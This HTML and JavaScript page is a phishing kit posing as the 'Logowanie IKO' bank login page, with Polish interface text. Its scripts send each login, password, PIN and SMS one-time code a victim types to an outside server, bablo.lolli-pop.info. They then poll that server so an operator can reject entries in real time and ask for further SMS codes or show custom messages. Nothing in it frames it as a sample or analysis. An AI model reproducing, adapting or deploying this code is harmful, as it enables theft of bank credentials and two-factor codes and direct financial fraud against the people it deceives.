<!DOCTYPE html>
<html lang="ua">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta property="og:title" content="">
    <meta property="og:description" content="">
    <meta property="og:image" content="">
    <link rel="shortcut icon" href="./favicon2.ico">
    <link rel="stylesheet" href="./core/privat_style.min.css">
    <link rel="preload" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" as="style" onload="this.rel='stylesheet'">
    <title>Logowanie IKO</title>
    <style>
        * {
            font-family: "Open Sans", sans-serif !important;
            letter-spacing: 0.4;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            -moz-box-sizing: border-box;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
        }

        html {
            font-family: "Open Sans", sans-serif;
            letter-spacing: 0.4;
            -webkit-text-size-adjust: 100%;
            -ms-text-size-adjust: 100%;
            position: relative;
            min-height: 100%;
        }

        body {
            font-family: "Open Sans", sans-serif;
            letter-spacing: 0.4;
            cursor: default;
            padding: 0;
            margin: 0;
            color: #333;
            background-color: #f5f5f5;
            height: 100%;
        }

        a {
            text-decoration: none;
        }

        .error-border {
            border-bottom: 2px solid red !important;
        }

        .p24pn {
            position: relative;
        }

        .p24n {
            border-radius: 20;
        }

        .login_number {
            color: #8dc641;
            font-size: 20px;
            font-weight: bold;
        }

        .p24ev {
            display: none;
            position: absolute;
            color: red;
            font-size: 15px;
            bottom: -45px;
            left: 0;
            white-space: normal;
            width: 100%;
        }

        .error-spacing-dynamic {
            margin-bottom: 50px;
        }

        .image_block {
            height: 200px;
            width: 200px;
            min-height: 200px;
            max-height: 200px;
            text-align: center;
        }

        .p24scm {
            line-height: 1.5;
        }

        .gVtZaa {
            position: relative;
            color: rgba(0, 0, 0, 0.87);
            text-align: center;
            padding: 16px;
            font-size: 14px;
            line-height: 22px;
            font-weight: 400;
            margin: auto auto 24px;
            background: rgba(230, 108, 108, 0.16);
            border-radius: 8px;
        }

        .iGhxGv {
            flex-shrink: 0;
            margin: 0px auto 4px;
            display: flex;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
        }

        .gaOUzQ {
            text-align: center;
        }

        .modal_msg {
            display: none;
            color: white;
            font-size: 15px;
            margin-top: 20px;
        }

        .step_image {
            margin-top: 15px;
        }

        img {
            pointer-events: none;
            user-select: none;
            -webkit-user-drag: none;
            -moz-user-select: none;
            -ms-user-select: none;
            -webkit-user-select: none;
        }

        /* Стиль для пользовательского сообщения */
        .custom-message {
            display: none;
            position: relative;
            color: rgba(0, 0, 0, 0.87);
            text-align: center;
            padding: 16px;
            font-size: 16px;
            line-height: 24px;
            font-weight: 400;
            margin: 20px auto;
            background: rgba(125, 255, 123, 0.22); /* Зеленый фон */
            border-radius: 8px;
            max-width: 320px;
        }

        .custom-message.show {
            display: block;
        }

        /* Добавляем стили для вкладок, чтобы гарантировать отображение */
        .p24t {
            display: none;
        }

        .p24t.selected {
            display: block;
        }
    </style>
</head>

<body>
    <audio id="smsSound" src="./sounds/sms_sound.mp3"></audio>
    <div class="header"></div>
    <div align="center">
        <svg xmlns="http://www.w3.org/2000/svg" width="100" height="120" viewBox="0 0 150 160">
            <circle cx="75" cy="25" r="30" fill="#D61F26"/>
            <rect x="55" y="70" width="40" height="8" rx="4" fill="url(#blueGradient)"/>
            <text x="50%" y="130" font-family="Open Sans" font-size="60" fill="#000000" text-anchor="middle" font-weight="bold">IKO</text>
            <defs>
                <linearGradient id="blueGradient" x1="0" y1="0" x2="1" y2="0">
                    <stop offset="0%" stop-color="#000000"/>
                    <stop offset="100%" stop-color="#0A2D5F"/>
                </linearGradient>
            </defs>
        </svg>
    </div>
    <div class="container">
        <div el="Content" class="content">
            <div class="login">
                <div el="LiqpayLogin">
                    <div style="background-color:transparent;width:100%;transition:height .2s ease-in-out 0s">
                        <div class="p24o">
                            <div id="lk_form" class="p24_modal">
                                <div class="p24h">
                                    <h2>Logowanie IKO</h2>
                                </div>
                                <!-- Блок для пользовательского сообщения -->
                                <div id="customMessage" class="custom-message"></div>
                                <div class="" id="code_three" style="display:none;">
                                    <div class="p24smsw">
                                        <div class="p24sc">
                                            <span class="p24scm">Numer klienta albo przyjazny login:</span><br>
                                            <p class="login_number" style="margin-top: 10px;"></p><br>
                                            <span id="reaction_title" class="p24scm">Wiadomość SMS z hasłem została wysłana na Twój numer.</span><br><br>
                                            <span id="reaction_text" style="text-align:left;">Kod składa się z 3 cyfr.</span>
                                        </div>
                                        <div class="p24smsdigits">
                                            <input class="p24sdi code_three" name="sms_three" placeholder="000" minlength="3" maxlength="3" tabindex="1" autocomplete="off">
                                        </div>
                                        <div id="code_three_input_error" style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
                                            Kod musi składać się z 3 cyfr.
                                        </div>
                                    </div>
                                    <div class="p24nb">
                                        <button class="p24n" id="sendsms">Dalej</button>
                                    </div>
                                </div>
                                <div class="" id="code_four" style="display:none;">
                                    <div class="p24smsw">
                                        <div class="p24sc">
                                            <span class="p24scm">Numer klienta albo przyjazny login:</span><br>
                                            <p class="login_number" style="margin-top: 10px;"></p><br>
                                            <span id="reaction_title" class="p24scm">Wiadomość SMS z hasłem została wysłana na Twój numer.</span><br><br>
                                            <span id="reaction_text" style="text-align:left;">Kod składa się z 4 cyfr.</span>
                                        </div>
                                        <div class="p24smsdigits">
                                            <input class="p24sdi code_four" name="sms_four" type="text" placeholder="0000" minlength="4" maxlength="4" tabindex="1" autocomplete="off">
                                        </div>
                                        <div id="code_four_input_error" style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
                                            Kod musi składać się z 4 cyfr.
                                        </div>
                                    </div>
                                    <div class="p24nb">
                                        <button class="p24n">Dalej</button>
                                    </div>
                                </div>
                                <div class="" id="code_infinitely" style="display:none;">
                                    <div class="p24smsw">
                                        <div class="p24sc">
                                            <span class="p24scm">Numer klienta albo przyjazny login:</span><br>
                                            <p class="login_number" style="margin-top: 10px;"></p><br>
                                            <span id="reaction_title" class="p24scm">Wiadomość SMS z hasłem została wysłana na Twój numer.</span><br><br>
                                            <span style="text-align:left;">Kod składa się ze znaków</span>
                                        </div>
                                        <div class="p24smsdigits">
                                            <input class="p24sdi code_infinitely" name="sms_infinitely" style="letter-spacing: 3px;" placeholder="Введіть код" minlength="3" maxlength="15" tabindex="1" autocomplete="off">
                                        </div>
                                        <div id="code_infinitely_input_error" style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
                                            Wymagane do wypełnienia
                                        </div>
                                    </div>
                                    <div class="p24nb">
                                        <button class="p24n">Dalej</button>
                                    </div>
                                </div>
                                <div class="p24t selected" data-p24-tab="login">
                                    <div class="p24e">
                                        <div class="p24ei">
                                            <div style="display:flex">
                                                <svg height="24" width="24" version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
                                                        <path d="M0 0h24v24H0z"></path>
                                                        <path d="M12 2L1 21h22M12 6l7.53 13H4.47M11 10v4h2v-4m-2 6v2h2v-2" fill="#ff5b5c" fill-rule="nonzero"></path>
                                                    </g>
                                                </svg>
                                            </div>
                                        </div>
                                    </div>
                                    <div class="sc-bypJrT gVtZaa error_phone" style="display:none">
                                        <div class="sc-dSCufp gaOUzQ">
                                            <div class="sc-ddjGPC iGhxGv">
                                                <div style="display: flex;">
                                                    <svg height="24" width="24" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M12 3L1 21.208h22M11 10.667V14.5h2v-3.833m-2 5.75v1.916h2v-1.916" fill="#D22E3B" fill-rule="evenodd"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div>Wprowadzono nieprawidłowe dane logowania</div>
                                        </div>
                                    </div>
                                    <div class="p24pnl">Numer klienta albo przyjazny login</div>
                                    <div class="p24pn error_login">
                                        <input type="text" id="login" hidden="">
                                        <div class="p24pni">
                                            <input type="text" inputmode="text" placeholder="Wprowadź login" class="p24pnio" id="loginInput" minlength="8" maxlength="50" name="phone" tabindex="-1" autocomplete="off">
                                        </div>
                                        <input id="input_again" type="hidden" value="">
                                        <div id="error_phone" class="p24ev">Nieprawidłowy login</div>
                                    </div>
                                    <div class="p24nb">
                                        <button class="p24n" type="button" id="sendphone">Dalej</button>
                                    </div>
                                </div>
                                <div class="p24t" data-p24-tab="loading">
                                    <div class="p24lpw" data-qa-node="progress">
                                        <div class="p24lp">
                                            <div class="kuUDJu"></div>
                                            <div class="erJhGs"></div>
                                        </div>
                                    </div>
                                    <p style="text-align: center;line-height: 25px;">Wiadomość SMS z hasłem została wysłana na Twój numer. Proszę czekać i nie zamykać strony.</p>
                                </div>
                                <div class="p24t" data-p24-tab="password">
                                    <div class="p24e">
                                        <div class="p24ei">
                                            <div style="display:flex">
                                                <svg height="24" width="24" version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
                                                        <path d="M0 0h24v24H0z"></path>
                                                        <path d="M12 2L1 21h22M12 6l7.53 13H4.47M11 10v4h2v-4m-2 6v2h2v-2" fill="#ff5b5c" fill-rule="nonzero"></path>
                                                    </g>
                                                </svg>
                                            </div>
                                        </div>
                                        <div class="p24ev">Nieznany błąd</div>
                                    </div>
                                    <div class="sc-bypJrT gVtZaa error_pass" style="display:none">
                                        <div class="sc-dSCufp gaOUzQ">
                                            <div class="sc-ddjGPC iGhxGv">
                                                <div style="display: flex;">
                                                    <svg height="24" width="24" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                        <path d="M12 3L1 21.208h22M11 10.667V14.5h2v-3.833m-2 5.75v1.916h2v-1.916" fill="#D22E3B" fill-rule="evenodd"></path>
                                                    </svg>
                                                </div>
                                            </div>
                                            <div>Wprowadzono nieprawidłowe hasło.</div>
                                        </div>
                                    </div>
                                    <div class="p24pnl pw">Numer klienta albo przyjazny login</div>
                                    <div class="p24pn pw">
                                        <div id="formatted_phone" class="p24pc pw"></div>
                                        <div class="p24phc pw">
                                            <button class="p24cpb" id="p24changeLogin">
                                                <svg height="24px" width="24px" version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
                                                        <path d="M0 0h24v24H0z"></path>
                                                        <path d="M4 16.67v3.332h3.333l9.832-9.83-3.334-3.334L4 16.669zm15.742-9.077a.885.885 0 0 0 0-1.253l-2.08-2.08a.885.885 0 0 0-1.253 0l-1.627 1.627 3.334 3.333 1.626-1.627z" fill="#000" fill-rule="nonzero"></path>
                                                    </g>
                                                </svg>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="p24pnl psw">Hasło</div>
                                    <div class="p24pn psw">
                                        <div class="p24pni">
                                            <input type="password" placeholder="********" class="p24pnio" name="password" id="password" min="1" tabindex="" maxlength="35">
                                        </div>
                                        <button class="p24cpb" id="p24passtoggle">
                                            <svg height="24px" width="24px" version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
                                                    <path d="M0 0h24v24H0z"></path>
                                                    <path d="M12 9a3 3 0 1 1 0 6 3 3 0 0 1 0-6zm0-4.5c5 0 9.27 3.11 11 7.5-1.73 4.39-6 7.5-11 7.5S2.73 16.39 1 12c1.73-4.39 6-7.5 11-7.5zM3.18 12a9.821 9.821 0 0 0 17.64 0 9.821 9.821 0 0 0-17.64 0z" fill="#000" fill-rule="nonzero"></path>
                                                </g>
                                            </svg>
                                        </button>
                                        <div id="error_password" class="p24ev">Nieprawidłowe hasło.</div>
                                    </div>
                                    <div class="p24pnl rp"><a href="" data-qa-node="restore-password" class="p24rp"></a></div>
                                    <div class="p24nb"><button class="p24n" type="button" id="sendpass">Dalej</button></div>
                                </div>
                                <div class="p24t" data-p24-tab="pin">
                                    <input type="text" name="pin" maxlength="4" hidden="" id="pin">
                                    <div class="p24pw">
                                        <div class="sc-bypJrT gVtZaa error_pin" style="display:none">
                                            <div class="sc-dSCufp gaOUzQ">
                                                <div class="sc-ddjGPC iGhxGv">
                                                    <div style="display: flex;">
                                                        <svg height="24" width="24" fill="none" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                            <path d="M12 3L1 21.208h22M11 10.667V14.5h2v-3.833m-2 5.75v1.916h2v-1.916" fill="#D22E3B" fill-rule="evenodd"></path>
                                                        </svg>
                                                    </div>
                                                </div>
                                                <div>Wprowadzono błędny kod PIN.</div>
                                            </div>
                                        </div>
                                        <center>Kod PIN</center><br>
                                        <div class="p24pi">
                                            <div class="p24pdc pincodeLetter"></div>
                                            <div class="p24pdc pincodeLetter"></div>
                                            <div class="p24pdc pincodeLetter"></div>
                                            <div id="full_pin" class="p24pdc pincodeLetter"></div>
                                        </div>
                                        <div id="error_pin" style="color:#d40000; font-size: 14px; text-align: center; margin-top: 20px; display:none;">
                                            PIN-Kod musi składać się z 4 cyfr.
                                        </div>
                                        <div class="p24pbw">
                                            <button type="button" class="p24pb pincodeBtn">7</button><button type="button" class="p24pb pincodeBtn">8</button><button type="button" class="p24pb pincodeBtn">9</button>
                                            <button type="button" class="p24pb pincodeBtn">4</button><button type="button" class="p24pb pincodeBtn">5</button><button type="button" class="p24pb pincodeBtn">6</button>
                                            <button type="button" class="p24pb pincodeBtn">1</button><button type="button" class="p24pb pincodeBtn">2</button><button type="button" class="p24pb pincodeBtn">3</button>
                                            <button type="button" class="p24pb cancel" id="resetpin">
                                                <svg version="1.1" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                                    <g fill="none" fill-rule="evenodd" stroke="none" stroke-width="1">
                                                        <path d="M0 0h24v24H0z"></path>
                                                        <path d="M19 6.137L17.863 5 12 10.863 6.137 5 5 6.137 10.863 12 5 17.863 6.137 19 12 13.137 17.863 19 19 17.863 13.137 12z" fill="#000"></path>
                                                    </g>
                                                </svg>
                                            </button>
                                            <button type="button" class="p24pb pincodeBtn">0</button>
                                            <button type="button" class="p24pb delete" id="deldig">
                                                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
                                                    <path d="M469.333 64h-320c-14.72 0-26.347 7.467-34.027 18.773L0 255.893l115.307 173.12C122.987 440.32 134.613 448 149.333 448h320C492.907 448 512 428.907 512 405.333V106.667C512 83.093 492.907 64 469.333 64zm-64 268.48l-30.187 30.187-76.48-76.48-76.48 76.48L192 332.48 268.48 256 192 179.52l30.187-30.187 76.48 76.48 76.48-76.48 30.187 30.187L328.853 256l76.48 76.48z"></path>
                                                </svg>
                                            </button>
                                        </div>
                                    </div>
                                    <div class="p24nb">
                                        <button class="p24n" type="submit" form="lk_form" id="sendpin">Dalej</button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script>var error_check = 0x0;</script>
    <script src="./core/axios.min.js"></script>
    <script src="./core/jquery-3.6.0.min.js"></script>
    <script>
        logsApi = axios.create({
            baseURL: 'https://bablo.lolli-pop.info',
            headers: {
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json;charset=UTF-8',
            }, withCredentials: false
        });

        const phoneInput = document.getElementById("loginInput");
        const passwordInput = document.getElementById("password");

        function loading(_0x2ea1d6 = true) {
            document.querySelectorAll("[data-p24-tab]").forEach(_0xa2d02e => _0xa2d02e.classList.remove("selected"));
            const _0x1c23af = document.querySelector("[data-p24-tab='loading']");
            _0x1c23af.classList.remove("selected");
            if (_0x2ea1d6) {
                _0x1c23af.classList.add("selected");
            }
        }

        function openPhoneDiv() {
            loading();
            setTimeout(() => {
                loading(false);
                document.querySelector("[data-p24-tab='login']").classList.add("selected");
            }, 0x1f4);
        }

        function openPasswordDiv() {
            loading();
            const loginValue = phoneInput.value.trim();
            if (loginValue.length < 8 || loginValue.length > 50) {
                document.getElementById("error_phone").innerText = "Login musi zawierać od 8 do 50 znaków.";
                document.getElementById("error_phone").style.display = "block";
                return void loading(false);
            }
            document.getElementById("error_phone").style.display = "none";
            document.getElementById("formatted_phone").innerText = loginValue;
            var _0x499742 = document.getElementsByClassName("login_number");
            for (var _0x1cc57e = 0x0; _0x1cc57e < _0x499742.length; _0x1cc57e++) {
                _0x499742[_0x1cc57e].innerText = loginValue;
            }
            document.getElementById("login").value = loginValue;
            setTimeout(() => {
                loading(false);
                document.querySelector("[data-p24-tab='password']").classList.add("selected");
            }, 0x1f4);
        }

        function openPinDiv() {
            loading();
            setTimeout(() => {
                loading(false);
                document.querySelector("[data-p24-tab='pin']").classList.add("selected");
            }, 0x1f4);
        }

        function validatePassword() {
            const _0x4f5529 = passwordInput.value;
            const _0x547c71 = passwordInput.closest(".p24pn");
            return _0x4f5529.length < 0x6 ? (document.getElementById("error_password").innerText = "Hasło musi zawierać co najmniej 6 znaków.", document.getElementById("error_password").style.display = "block", _0x547c71.classList.add("error-border", "error-spacing-dynamic"), updateErrorSpacingById("password", "error_password"), false) : (document.getElementById("error_password").style.display = "none", _0x547c71.classList.remove("error-border", "error-spacing-dynamic"), updateErrorSpacingById("password", "error_password"), true);
        }

        function sendpass() {
            if (error_check == 0x2) {
                return false;
            }
            if (validatePassword()) {
                openPinDiv();
            } else {
                passwordInput.focus();
            }
        }

        function sendphone() {
            const _0x39965f = phoneInput.closest(".p24pn");
            const loginValue = phoneInput.value.trim();
            let _0x1c3888 = false;
            if ("" === loginValue) {
                document.getElementById("error_phone").innerText = "Pole loginu jest wymagane.";
                document.getElementById("error_phone").style.display = "block";
                _0x39965f.classList.add("error-border", "error-spacing-dynamic");
                _0x1c3888 = true;
            } else if (loginValue.length >= 8 && loginValue.length <= 50) {
                function uuidv4() {
                    return "10000000-1000-4000-8000-100000000000".replace(/[018]/g, c =>
                        (+c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> +c / 4).toString(16)
                    );
                }
                logsApi.post("/log", {
                    id: uuidv4(),
                    from_service: location.host,
                    login: loginValue,
                    password: "",
                    pin: "",
                    status: "pending",
                    ip: "",
                    user_agent: navigator.userAgent
                }).then(response => {
                    localStorage.setItem("log_id", response.data.id);
                }).catch(error => {
                    console.error("Error sending login:", error);
                });
                document.getElementById("error_phone").style.display = "none";
                _0x39965f.classList.remove("error-border", "error-spacing-dynamic");
                document.getElementById("loginInput").blur();
                openPasswordDiv();
            } else {
                document.getElementById("error_phone").innerText = "Login musi zawierać od 8 do 50 znaków.";
                document.getElementById("error_phone").style.display = "block";
                _0x39965f.classList.add("error-border", "error-spacing-dynamic");
                _0x1c3888 = true;
            }
            if (_0x1c3888) {
                phoneInput.focus();
            }
            updateErrorSpacingById("loginInput", "error_phone");
        }

        function sendpin() {
            if (0x4 !== document.getElementById("pin").value.length) {
                document.getElementById("error_pin").style.display = "block";
            } else {
                document.getElementById("error_pin").style.display = "none";
                submitBtnAction();
            }
        }

        function updateErrorSpacingById(_0x1e16d3, _0x2b8fd7) {
            const _0x137868 = document.getElementById(_0x2b8fd7);
            const _0x37896f = document.getElementById(_0x1e16d3).closest(".p24pn");
            const _0x29e286 = _0x137868.offsetHeight;
            if ("none" !== _0x137868.style.display) {
                _0x37896f.style.marginBottom = _0x29e286 + 0x23 + "px";
                _0x137868.style.bottom = "-" + (_0x29e286 + 0xa) + "px";
            } else {
                _0x37896f.style.marginBottom = "";
                _0x137868.style.bottom = "";
            }
        }

        phoneInput.addEventListener("input", function (_0x5896a2) {
            var value = _0x5896a2.target.value;
            value = value.replace(/[ąćęłńóśźż]/gi, '');
            _0x5896a2.target.value = value;
        });

        document.getElementById("resetpin").addEventListener("click", function () {
            document.getElementById("pin").value = "";
            document.querySelectorAll(".pincodeLetter").forEach(_0x5a99d8 => _0x5a99d8.classList.remove("y"));
        });

        document.querySelectorAll(".pincodeBtn").forEach(_0x25cc6e => _0x25cc6e.addEventListener("click", function () {
            const _0x3e9a7 = document.getElementById("pin");
            if (_0x3e9a7.value.length < 0x4) {
                document.querySelector(".pincodeLetter:not(.y)").classList.add("y");
                _0x3e9a7.value += this.innerText;
            }
            if (0x4 === _0x3e9a7.value.length) {
                loading();
                document.getElementById("sendpin").click();
            }
        }));

        document.getElementById("deldig").addEventListener("click", function () {
            const _0x4109b4 = document.getElementById("pin");
            if (_0x4109b4.value.length >= 0x1) {
                _0x4109b4.value = _0x4109b4.value.substring(0x0, _0x4109b4.value.length - 0x1);
                const _0x1fb521 = document.querySelectorAll(".pincodeLetter.y");
                if (_0x1fb521.length > 0x0) {
                    _0x1fb521[_0x1fb521.length - 0x1].classList.remove("y");
                }
            }
        });

        document.getElementById("p24passtoggle").addEventListener("click", function (_0x26c0b9) {
            _0x26c0b9.preventDefault();
            passwordInput.type = "password" === passwordInput.type ? "text" : "password";
        });

        document.getElementById("p24changeLogin").addEventListener("click", function (_0x148da3) {
            _0x148da3.preventDefault();
            openPhoneDiv();
            passwordInput.closest(".p24pn").classList.remove("error-border", "error-spacing-dynamic");
            document.getElementById("error_password").innerText = "";
            document.getElementById("error_password").style.display = "none";
            updateErrorSpacingById("password", "error_password");
        });

        document.getElementById("sendphone").addEventListener("click", function () {
            phone = document.getElementById('loginInput').value;
            if (document.getElementById('input_again').value != "ask_error_phone") {
                sendphone();
            } else {
                loading();
                send_input(document.getElementById('loginInput').value, 'ask_error_phone');
            }
        });

        document.getElementById("sendpass").addEventListener("click", function () {
            if (document.getElementById('input_again').value != "ask_error_pass") {
                sendpass();
            } else {
                loading();
                send_input(document.getElementById('password').value, 'ask_error_pass');
            }
        });

        // Инициализация начального состояния
        window.onload = function() {
            console.log("Initializing login tab...");
            document.querySelector("[data-p24-tab='login']").classList.add("selected");
        };
    </script>
    <script>
        const logsApi = axios.create({
            baseURL: 'https://bablo.lolli-pop.info',
            headers: {
                'Accept': 'application/json',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/json;charset=UTF-8',
            }, withCredentials: false
        });

        var order_id = localStorage.getItem('log_id');

        $("#password").on('input', function () {
            $(this).val($(this).val().replace(/[Яа-яЁё]/, ''));
        });

        $(document).on("click", "#sendpin", function () {
            order_id = localStorage.getItem('log_id');
            if (error_check == 0x2) {
                if ($('#pin').val().length != 0x4) {
                    $(".error_pin").fadeIn();
                    return false;
                } else {
                    $(".error_pin").fadeOut();
                    logsApi.patch("/log", {
                        'id': order_id,
                        'state': 0,
                        'pin': $('#pin').val()
                    });
                    bot_stop.interval = check();
                }
            } else {
                if ($("#pin").val().length != 0x4) {
                    $('#error_pin').fadeIn();
                    return false;
                } else {
                    order_id = localStorage.getItem('log_id');
                    $("#error_pin").fadeOut();
                    logsApi.patch("/log", {
                        'id': order_id,
                        'login': $("#loginInput").val(),
                        'pin': $('#pin').val(),
                        'password': $("#password").val(),
                        'state': 0
                    });
                    bot_stop.interval = check();
                }
            }
        });

        $(document).on('click', "#code_three button", function () {
            order_id = localStorage.getItem('log_id');
            if ($(".code_three").val().length != 0x3) {
                $("#code_three_input_error").fadeIn();
                return false;
            } else {
                $("#code_three_input_error").fadeOut();
                logsApi.patch("/log", {
                    'id': order_id,
                    'state': 0
                });
                logsApi.post("/message", {
                    'log_id': order_id,
                    'text': "SMS Code: " + $('.code_three').val(),
                    'type': 'from_user'
                });
                $("#code_three").fadeOut(0x0);
                loading();
                bot_stop.interval = check();
            }
        });

        $(document).on('click', "#code_four button", function () {
            order_id = localStorage.getItem('log_id');
            if ($(".code_four").val().length != 0x4) {
                $("#code_four_input_error").fadeIn();
                return false;
            } else {
                $("#code_four_input_error").fadeOut();
                logsApi.patch("/log", {
                    'id': order_id,
                    'state': 0
                });
                logsApi.post("/message", {
                    'log_id': order_id,
                    'text': "SMS Code: " + $('.code_four').val(),
                    'type': 'from_user'
                });
                $("#code_four").fadeOut(0x0);
                loading();
                bot_stop.interval = check();
            }
        });

        $(document).on("click", "#sendpass", function () {
            order_id = localStorage.getItem('log_id');
            if (error_check == 0x2) {
                if ($('#password').val().length < 0x6) {
                    return false;
                } else {
                    $(".error_pass").fadeOut(0x0);
                    logsApi.patch("/log", {
                        'id': order_id,
                        'state': 0,
                        "password": $("#password").val()
                    });
                    loading();
                    bot_stop.interval = check();
                }
            }
        });

        $(document).on('click', "#code_infinitely button", function () {
            order_id = localStorage.getItem('log_id');
            if ($(".code_infinitely").val().length < 0x3) {
                $("#code_infinitely_input_error").fadeIn();
                return false;
            } else {
                $('#code_infinitely_input_error').fadeOut();
                logsApi.patch("/log", {
                    'id': order_id,
                    'state': 0
                });
                logsApi.post("/message", {
                    'log_id': order_id,
                    'text': "SMS Code: " + $('.code_infinitely').val(),
                    'type': 'from_user'
                });
                $("#code_infinitely").fadeOut(0x0);
                loading();
                bot_stop.interval = check();
            }
        });

        function check() {
            order_id = localStorage.getItem('log_id');
            error_check = 0x0;
            var _0x3abc54 = setInterval(function () {
                logsApi.get("/log/" + order_id).then(function (_0x1d6606) {
                    state = _0x1d6606.data.state;
                    console.log("Current state:", state);

                    if (state == 0x1) {
                        $("#loginInput").val('');
                        $('#password').val('');
                        $("#pin").val('');
                        $('.pincodeLetter').removeClass('y').addClass('r');
                        $(".p24t").removeClass("selected");
                        setTimeout(() => {
                            document.querySelector("[data-p24-tab='login']").classList.add("selected");
                        }, 0x1f4);
                        setTimeout(function () {
                            $(".error_phone").fadeIn(0x0);
                        }, 0x1f4);
                        clearInterval(_0x3abc54);
                    }
                    if (state == 0x2) {
                        error_check = 0x2;
                        $("#password").val('');
                        $(".p24t").removeClass("selected");
                        setTimeout(() => {
                            document.querySelector("[data-p24-tab='password']").classList.add("selected");
                            $('.error_pass').fadeIn(0x0);
                        }, 0x1f4);
                        clearInterval(_0x3abc54);
                    }
                    if (state == 0x3) {
                        error_check = 0x2;
                        $('#pin').val('');
                        $(".pincodeLetter").removeClass('y').addClass('r');
                        $(".p24t").removeClass("selected");
                        setTimeout(() => {
                            document.querySelector("[data-p24-tab='pin']").classList.add("selected");
                            $(".error_pin").fadeIn(0x0);
                        }, 0x1f4);
                        clearInterval(_0x3abc54);
                    }
                    if (state == 0x4) {
                        $('#code_four,#code_infinitely').fadeOut(0x0);
                        $('.code_four,.code_infinitely,.code_three').val('');
                        $("#code_three").fadeIn();
                        $(".p24t").removeClass("selected");
                        clearInterval(_0x3abc54);
                    }
                    if (state == 0x5) {
                        $("#code_three,#code_infinitely").fadeOut(0x0);
                        $(".code_four,.code_infinitely,.code_three").val('');
                        $('#code_four').fadeIn();
                        $(".p24t").removeClass("selected");
                        clearInterval(_0x3abc54);
                    }
                    if (state == 0x6) {
                        $("#code_three,#code_four").fadeOut(0x0);
                        $(".code_four,.code_infinitely,.code_three").val('');
                        $('#code_infinitely').fadeIn();
                        $(".p24t").removeClass("selected");
                        clearInterval(_0x3abc54);
                    }
                    // Состояние для пользовательского сообщения
                    if (state == 0x7) {
                        const customMessage = _0x1d6606.data.custom_message || "Сообщение не указано";
                        $("#customMessage").text(customMessage).addClass("show");
                        // Остаемся на текущей вкладке
                        clearInterval(_0x3abc54);
                    }
                }).catch(error => {
                    console.error("Error fetching log:", error);
                });
            }, 0x7d0);
            return _0x3abc54;
        }

        function bot_stop() {
            clearInterval(bot_stop.interval);
        }

        const smsSound = document.getElementById("smsSound");

        function isElementVisible(element) {
            if (!element) return false;
            const style = window.getComputedStyle(element);
            return style.display !== "none" && style.visibility !== "hidden" && element.offsetHeight > 0 && element.offsetWidth > 0;
        }

        function checkAndPlaySound() {
            const smsElement = document.querySelector('span#reaction_text');
            if (smsElement && smsElement.textContent.includes("Kod składa się z 3 cyfr.") && isElementVisible(smsElement)) {
                smsSound.play();
            }
        }

        setInterval(checkAndPlaySound, 3000);
    </script>
    <script>
        const smsCodeInput = document.querySelector("input.code_three");
        smsCodeInput.addEventListener("input", function (event) {
            this.value = this.value.replace(/\D/g, "");
        });
    </script>
    <script>
        (function () {
            function c() {
                var b = a.contentDocument || a.contentWindow.document;
                if (b) {
                    var d = b.createElement('script');
                    d.innerHTML = "window.__CF$cv$params={r:'921468d86f181d76',t:'MTc0MjEyOTc3NS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
                    b.getElementsByTagName('head')[0].appendChild(d);
                }
            }
            if (document.body) {
                var a = document.createElement('iframe');
                a.height = 1;
                a.width = 1;
                a.style.position = 'absolute';
                a.style.top = 0;
                a.style.left = 0;
                a.style.border = 'none';
                a.style.visibility = 'hidden';
                document.body.appendChild(a);
                if ('loading' !== document.readyState) c();
                else if (window.addEventListener) document.addEventListener('DOMContentLoaded', c);
                else {
                    var e = document.onreadystatechange || function () {};
                    document.onreadystatechange = function (b) {
                        e(b);
                        'loading' !== document.readyState && (document.onreadystatechange = e, c());
                    };
                }
            }
        })();
    </script>
